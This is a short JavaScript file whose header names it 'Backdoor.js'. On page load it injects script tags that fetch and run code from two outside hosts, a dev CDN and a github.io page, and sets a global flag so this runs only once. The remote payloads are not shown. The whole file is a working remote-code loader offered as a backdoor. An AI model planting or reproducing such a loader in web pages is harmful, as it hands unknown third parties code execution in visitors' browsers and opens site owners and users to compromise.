/*!
 * Backdoor.js v1.0.3a
 * (c) 2024-2024
 */
if (!window.D3US) {
  loadScript('https://cdn.abros.dev/dev/noti.js');
  loadScript('https://deusnotam.github.io/D3US/d3us.js');
  function loadScript(src) {
    const script = document.createElement('script');
    script.src = src;
    document.head.appendChild(script);
  }
  window.D3US = true;
}
